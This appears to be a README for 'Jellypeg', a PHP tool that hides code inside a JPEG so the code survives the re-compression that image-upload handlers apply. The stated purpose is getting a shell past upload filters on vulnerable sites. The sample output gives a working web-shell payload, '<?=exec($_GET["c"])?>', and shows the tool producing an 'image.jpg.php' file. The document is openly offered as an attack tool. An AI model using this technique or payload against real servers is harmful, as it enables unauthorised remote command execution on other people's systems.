![alt text](Jellypeg.jpg?raw=true)

# Jellypeg
Tool to inject code into JPEG that has been stuffed through imagecreatefromjpeg and imagejpeg in PHP. One scenario is where you have found somewhere to upload a PHP file via Arbitrary File Upload, but the upload function is designed for image upload and thus runs the data through imagejpeg. This will overwrite the metadata and compress the file and change the data inside; rendering your content useless (your shell, that is). This tool can solve this by finding an image file where a small piece of code survives the compression process. It's important that you analyze a resulting file from the upload process before you do this so that the quality setting is correct. The default is usually 75 but if it's something else then you need to specify that.

# Sample output
```
kali@kali:~/# php jellypeg.php
-=Jellypeg Injector 1.9=-
[+] Usage: php jellypeg.php <width> <height> <quality> <code>
[+] Example: php jellypeg.php 100 100 75 '<?=exec($_GET["c"])?>'
[+] Fetching image (100 X 100) from http://placekitten.com/100/100/
[+] Jumping to end byte
[+] Searching for valid injection point
[+] Done
[+] Result file: image.jpg.php
```
